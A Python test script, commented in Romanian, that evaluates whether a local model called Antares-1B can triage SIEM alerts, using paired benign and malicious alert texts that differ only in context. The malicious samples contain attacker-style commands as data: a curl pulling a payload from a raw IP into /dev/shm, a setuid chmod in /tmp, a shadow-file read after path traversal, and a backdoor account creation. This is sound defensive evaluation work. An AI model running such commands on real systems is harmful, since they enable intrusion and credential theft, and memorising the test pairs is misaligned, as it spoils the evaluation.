#!/usr/bin/env python3
"""
Testeaza daca Antares-1B poate face triaj de alerte in text liber.

Trei intrebari, in ordinea importantei:
  1. CONSISTENTA  -- produce JSON valid de fiecare data?
  2. DISCRIMINARE -- raspunde diferit la alerte care difera doar prin context?
  3. CALIBRARE    -- variaza confidence, sau da mereu 100?

A doua e testul real. Un model care produce text plauzibil dar identic
pentru cazuri diferite nu triaza, doar vorbeste. E exact esecul masurat
in faza B (TNR=0).

Utilizare:
    python3 test_triage.py            # toate testele
    python3 test_triage.py --n 10     # 10 repetari per caz
"""

from __future__ import annotations

import argparse
import json
import re
import statistics as st
import sys
import urllib.request

ENDPOINT = "http://127.0.0.1:8000/v1/completions"
MODEL = "antares-1b"

SYSTEM = "You are a security analyst triaging SIEM alerts."

INSTRUCTION = (
    "Return ONLY a JSON object with fields: verdict (one of TP/FP), "
    "confidence (0-100), reason (max 20 words)."
)

# ---------------------------------------------------------------------------
# Perechile de test.
#
# Fiecare pereche difera DOAR prin context (proces parinte, activitate
# precedenta, tipar de nume). Regula declansata si actiunea sunt identice.
# Un triager real trebuie sa le separe; unul care doar genereaza text
# plauzibil le va trata la fel.
# ---------------------------------------------------------------------------

PAIRS = [
    {
        "name": "useradd: deploy vs atac",
        "fp": ("Alert: rule 'Linux User Account Creation'. Process: useradd "
               "svc_deploy_1734 --system --no-create-home --shell /usr/sbin/nologin. "
               "User: root. Host: build-runner-03. Parent process: ansible-playbook. "
               "Host role: CI build server. Prior activity: 47 similar account "
               "creations on this host in the last 30 days, all closed as benign."),
        "tp": ("Alert: rule 'Linux User Account Creation'. Process: useradd -m -s "
               "/bin/bash backupsvc. User: root. Host: db-prod-01. Parent process: "
               "bash. Host role: production database. Prior activity: wget from "
               "185.220.101.44 two minutes earlier; no prior account creations on "
               "this host in 90 days."),
    },
    {
        "name": "chmod: rotatie de log vs setuid",
        "fp": ("Alert: rule 'File Permission Modification in Writable Directory'. "
               "Process: chmod 644 /var/log/app/access.log.1. User: root. "
               "Host: web-02. Parent process: logrotate. Prior activity: identical "
               "event daily at 00:00 for the past 6 months."),
        "tp": ("Alert: rule 'File Permission Modification in Writable Directory'. "
               "Process: chmod 4755 /tmp/.cache/upd. User: root. Host: web-02. "
               "Parent process: sh. Prior activity: file written 30 seconds earlier "
               "by a process spawned from nginx."),
    },
    {
        "name": "cat /etc/shadow: audit vs exfiltrare",
        "fp": ("Alert: rule 'Potential Shadow File Read via Command Line Utilities'. "
               "Process: cat /etc/shadow. User: root. Host: audit-scanner-01. "
               "Parent process: lynis. Host role: dedicated compliance scanner. "
               "Prior activity: same event weekly, always from lynis."),
        "tp": ("Alert: rule 'Potential Shadow File Read via Command Line Utilities'. "
               "Process: cat /etc/shadow. User: www-data. Host: web-01. Parent "
               "process: sh, spawned by php-fpm. Prior activity: HTTP request with "
               "'../../../' in the path 4 seconds earlier."),
    },
    {
        "name": "curl outbound: pachete vs C2",
        "fp": ("Alert: rule 'Anomalous Outbound Connection'. Process: curl -sSL "
               "https://deb.nodesource.com/setup_20.x. User: root. Host: build-01. "
               "Parent process: bash, spawned by jenkins-agent. Destination: "
               "104.16.0.0/12 (Cloudflare). Prior activity: routine during builds."),
        "tp": ("Alert: rule 'Anomalous Outbound Connection'. Process: curl -s "
               "http://45.9.148.99:8443/a -o /dev/shm/.x. User: www-data. "
               "Host: web-01. Parent process: sh. Destination: 45.9.148.99, no "
               "reverse DNS, first seen on this network. Prior activity: none."),
    },
]


def call(prompt_body: str, max_tokens: int = 300, temperature: float = 0.3) -> str:
    prompt = (
        f"<|start_of_role|>system<|end_of_role|>{SYSTEM}<|end_of_text|>\n"
        f"<|start_of_role|>user<|end_of_role|>{prompt_body}\n\n{INSTRUCTION}"
        f"<|end_of_text|>\n"
        f"<|start_of_role|>assistant<|end_of_role|>"
    )
    payload = json.dumps({
        "model": MODEL,
        "prompt": prompt,
        "max_tokens": max_tokens,
        "temperature": temperature,
        "stop": ["<|end_of_text|>", "<|start_of_role|>"],
    }).encode()

    req = urllib.request.Request(
        ENDPOINT, data=payload, headers={"Content-Type": "application/json"}
    )
    with urllib.request.urlopen(req, timeout=300) as r:
        return json.loads(r.read())["choices"][0]["text"]


def parse(text: str) -> dict | None:
    """Extrage primul obiect JSON din raspuns. None daca nu e parsabil."""
    m = re.search(r"\{.*?\}", text, re.S)
    if not m:
        return None
    try:
        d = json.loads(m.group(0))
    except json.JSONDecodeError:
        return None
    if "verdict" not in d:
        return None
    return d


def run_case(body: str, n: int) -> list[dict | None]:
    out = []
    for i in range(n):
        try:
            out.append(parse(call(body)))
        except Exception as e:
            print(f"    eroare la rularea {i+1}: {e}", file=sys.stderr)
            out.append(None)
    return out


def main() -> int:
    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument("--n", type=int, default=5, help="repetari per caz")
    args = p.parse_args()

    print(f"Model: {MODEL}   repetari per caz: {args.n}")
    print("=" * 68)

    total_calls = 0
    total_parsed = 0
    all_conf: list[float] = []
    discriminated = 0

    for pair in PAIRS:
        print(f"\n{pair['name']}")

        results = {}
        for kind in ("fp", "tp"):
            runs = run_case(pair[kind], args.n)
            total_calls += len(runs)
            ok = [r for r in runs if r]
            total_parsed += len(ok)

            verdicts = [str(r.get("verdict", "?")).upper() for r in ok]
            confs = [r.get("confidence") for r in ok if isinstance(r.get("confidence"), (int, float))]
            all_conf.extend(confs)
            results[kind] = verdicts

            expected = kind.upper()
            correct = sum(1 for v in verdicts if v == expected)
            label = "benign (asteptat FP)" if kind == "fp" else "malitios (asteptat TP)"
            print(f"  {label:24} {correct}/{len(runs)} corect   "
                  f"verdicte: {','.join(verdicts) or 'niciun JSON valid'}")
            if ok and ok[0].get("reason"):
                print(f"    exemplu reason: {ok[0]['reason'][:90]}")

        # Discriminare: majoritatea FP a spus FP SI majoritatea TP a spus TP?
        def majority(vs, target):
            return vs and sum(1 for v in vs if v == target) > len(vs) / 2
        if majority(results["fp"], "FP") and majority(results["tp"], "TP"):
            discriminated += 1
            print("  -> DISCRIMINEAZA")
        else:
            print("  -> nu discrimineaza")

    print("\n" + "=" * 68)
    print(f"1. CONSISTENTA   JSON valid in {total_parsed}/{total_calls} "
          f"({100*total_parsed/total_calls:.0f}%)")
    print(f"2. DISCRIMINARE  {discriminated}/{len(PAIRS)} perechi separate corect")
    if all_conf:
        print(f"3. CALIBRARE     confidence: min={min(all_conf)} max={max(all_conf)} "
              f"medie={st.mean(all_conf):.0f} "
              f"({len(set(all_conf))} valori distincte din {len(all_conf)})")
    print()
    print("Interpretare: discriminarea e testul care conteaza. Consistenta mare")
    print("cu discriminare mica inseamna text plauzibil, nu triaj.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
